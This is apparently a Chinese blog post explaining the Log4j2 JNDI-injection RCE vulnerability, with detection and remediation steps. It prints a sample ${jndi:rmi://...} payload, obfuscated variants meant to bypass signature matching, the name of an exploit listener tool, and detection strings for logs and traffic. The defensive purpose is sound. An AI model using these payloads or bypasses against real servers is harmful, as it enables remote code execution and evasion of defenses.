

## 原理
Apache Log4j2远程代码执行漏洞。

由于Apache Log4j2某些功能存在递归解析功能，**攻击者可直接构造恶意请求**，触发远程代码执行漏洞。**漏洞利用无需特殊配置**
通过JNDI注入漏洞，黑客可以恶意构造特殊数据请求包，触发此漏洞，从而成功利用此漏洞可以在目标服务器上执行任意代码。


## []()JNDI是什么

JNDI（Java Naming and Directory Interface ），类似于在一个中心注册一个东西，以后要用的时候，只需要根据名字去注册中心查找，注册中心返回你要的东西。web程序，我们可以将一些东西（比如数据库相关的）交给服务器软件去配置和管理（有全局配置和单个web程序的配置），在程序代码中只要通过名称查找就能得到我们注册的东西，而且如果注册的东西有变，比如更换了数据库，我们只需要修改注册信息，名称不改，因此代码也不需要修改。

## []()攻击的格式

```
${jndi:rmi://127.0.0.1:7777/HelloService1}
Log4j2的lookup功能支持一些特殊的写法来对字符做二次处理
如${lower:j}Ndi、${upper:JN}di、${aaa:vv:cc:-j}ndi等写法
都能打破字符串的连续性，造成利用时候的流量特征极为不明显。
```

## []()接收端的工具

```
JNDIExploit
```

## []()流量特征

[dnslog.cn](http://dnslog.cn/)\
jndi\
rmi\
看log4j的日志

流量监测 – 第三方自定义防护策略，可通过自定义正则匹配应用于各类安全产品，**但不建议作为唯一防护手段**，根据长亭安全团队的反馈，我们已经看到存在混淆的攻击 Payload 尝试绕过字符匹配检测，

```
如：（${$ {::-j}${::-n}${::-d}${::-i})。
```

## []()漏洞排查方法

1. 版本排查\
   存在该漏洞的Log4j2组件版本为：Log4j2.X < Log4j-2.15.0-rc2。具体组件版本排查方法如下：\
   （1）根据Java JAR解压后是否存在org/apache/logging/log4j相关路径结构，查询Log4j2组件及其版本情况。\
   （2）若程序使用Maven打包，查看项目的pom.xml文件中org.apache.logging.log4j相关字段及版本情况。\
   （3）若程序使用Gradle打包，可查看build.gradle编译配置文件，查看中org.apache.logging.log4j相关字段及版本情况。\
   2.中间件排查\
   Apache Log4j2组件通常会嵌套在其他中间件使用，需要相关人员查看开发文档或联系系统开发商、维护人员进行判断是否有使用相关中间件。涉及的受影响中间件或应用，包括但不限于：Apache Solr、Apache Druid、Apache Struts2、Apache Flink、Flume、Dubbo、Redis、Logstash、ElasticSearch、Kafka、Ghidra、Minecraft、Apache hive、Datax、Streaming、Dolphin Scheduler、Storm、Spring等。

## []()攻击情况排查

**日志排查**\
攻击者常采用dnslog方式进行扫描、探测，对于常见漏洞利用方式对应用系统报错日志中的

```
“javax.naming.CommunicationException”、“javax.naming.NamingException:problem generating object using object factory”、“Error lookingup JNDI resource”
```

等关键字段进行排查。\
**流量排查**\
攻击者的漏洞利用数据包中可能存在

```
“${jndi:rmi”、“${jndi:ldap”
```

等字样，通过监测相关流量是否存在上述字符以发现可能的攻击行为。

## []()log4j2 快速修复措施

据 Apache 官方最新信息显示，release 页面上已经更新了 Log4j 2.15.0 版本，主要是那个log4j-core包，漏洞就是在这个包里产生的，如果你的程序有用到，尽快紧急升级。\
**临时解决方案**

```
    设置jvm参数 “-Dlog4j2.formatMsgNoLookups=true”
    设置“log4j2.formatMsgNoLookups=True”
    系统环境变量“FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS”设置为“true”
    关闭对应应用的网络外连，禁止主动外连
```

